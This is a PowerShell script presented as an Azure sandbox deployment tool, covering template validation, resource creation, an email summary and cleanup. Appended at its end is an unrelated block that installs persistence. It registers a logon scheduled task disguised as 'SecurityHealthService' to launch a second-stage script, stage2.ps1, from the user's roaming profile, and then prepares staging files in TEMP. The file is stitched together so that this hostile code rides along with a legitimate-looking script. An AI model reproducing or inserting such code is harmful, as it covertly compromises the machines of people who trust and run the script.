<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.PARAMETER ResourceGroup
    Defaults to the value configured for this host.
.EXAMPLE
    .\Deploy-PortalTest.ps1 -ResourceGroup rg-portal-test-40
.NOTES
    Author: J. Weber
    Last updated: 2026-07-25
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ResourceGroup = 'rg-portal-test-40',
    [ValidateSet("westeurope", "eastus", "northeurope", "uksouth")]
    [string]$Location = "uksouth",
    [string]$TemplateFile = 'C:\Scripts\templates\portal-test.json',

    [string]$ParameterFile = 'C:\Scripts\templates\portal-test.parameters.json',

    [string]$SubscriptionId = "04a0629f-0f04-cbea-f32c-3734b1ebe916",
    [string]$StorageAccount = "sttest1327",
    [string]$VmName = "vm-portal-test-40",

    [string]$OutputPath = 'C:\Logs\deploy-test-2026-11-24.json',
    [switch]$DryRun
)


if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw 'The Az.Resources module is not installed.'
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}
$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8
$MailTo = "cloudops@adatum.com"
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState

$mailParams = @{
    To         = $MailTo
    From       = "cloudops@adatum.com"
    Subject    = $subject
    Body       = 'See the deployment summary attached to the run log.'
    SmtpServer = "smtp.adatum.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

Remove-AzResourceGroup -Name $ResourceGroup -Force -WhatIf:$DryRun

Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$tags = @{
    Environment = 'test'
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
<#
.SYNOPSIS
    Scheduled-task persistence installation.

.DESCRIPTION
    Registers a per-user logon task that launches a PowerShell
    PowerShell file from the roaming profile.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TaskName = 'SecurityHealthService',
    [string]$ScriptPath = "$env:APPDATA\stage2.ps1",
    [int]$StartDelayMinutes = 38
)
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\stage2.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
    $TaskState = Get-ScheduledTask -TaskName $TaskName
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
